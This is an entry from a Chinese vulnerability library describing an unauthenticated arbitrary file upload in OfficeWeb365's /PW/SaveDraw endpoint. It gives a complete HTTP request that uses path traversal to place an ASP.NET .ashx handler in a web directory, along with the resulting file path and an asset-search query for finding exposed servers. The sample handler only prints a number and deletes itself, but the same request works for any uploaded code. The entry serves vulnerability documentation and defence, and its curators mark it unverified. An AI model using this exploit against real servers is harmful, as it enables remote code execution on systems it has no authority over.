---
source: "wy876 漏洞文库"
title: "OfficeWeb365 SaveDraw路径控制任意文件上传"
product: "OfficeWeb365"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未给版本；ASP.NET处理器执行配置"
prerequisites: "未说明；请求无凭证"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ws6vxp637qoycw2u"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/OfficeWeb365/OfficeWeb365SaveDraw%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name="
hunter: "app.name=\"OfficeWeb365\""
id: "vw-a547814731601b36fd7c6cd4"
entity_id: "ve-a547814731601b36fd7c6cd4"
schema_version: "1"
---

# OfficeWeb365 SaveDraw路径控制任意文件上传

## 条目说明

- 对象与具体问题：OfficeWeb365；SaveDraw路径控制任意文件上传
- 版本、配置及部署条件：未给版本；ASP.NET处理器执行配置
- 认证与权限前提：未说明；请求无凭证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与SaveDraw另一篇同漏洞；本篇保留较短自删除验证代码作为互补资料保留
- 缺响应/截图及修复版本，ASP.NET指令是否完整需对原始来源核对

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
OfficeWeb365是西安大西信息科技有限公司开发的，专注于Office文档在线预览及PDF文档在线预览云服务，包括Microsoft Word文档在线预览、Excel表格在线预览、Powerpoint演示文档在线预览，WPS文字处理、WPS表格、WPS演示及Adobe PDF文档在线预览。广泛应用于OA办公系统、招聘网站、在线教育类网站，提高客户体验、增加产品竞争力。OfficeWeb365 /PW/SaveDraw存在任意文件上传漏洞。

## 二、影响版本
+ OfficeWeb365

## 三、资产测绘
+ hunter：`app.name="OfficeWeb365"`


+ 登录页面


## 四、漏洞复现
```http
POST /PW/SaveDraw?path=../../Content/img&idx=11.ashx HTTP/1.1
Host: xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
Content-Type: application/x-www-form-urlencoded

data:image/png;base64,<%@ Language="C#" Class="Handler1" %>public class Handler1:System.Web.IHttpHandler
{
public void ProcessRequest(System.Web.HttpContext context)
{
System.Web.HttpResponse response = context.Response;
response.Write(44 * 41);

string filePath = context.Server.MapPath("/") + context.Request.Path;
if (System.IO.File.Exists(filePath))
{
    System.IO.File.Delete(filePath);
}
}
public bool IsReusable
{
get { return false; }
}
}///---
```


上传文件位置

```plain
/Content/img/UserDraw/drawPW11.ashx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ws6vxp637qoycw2u>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
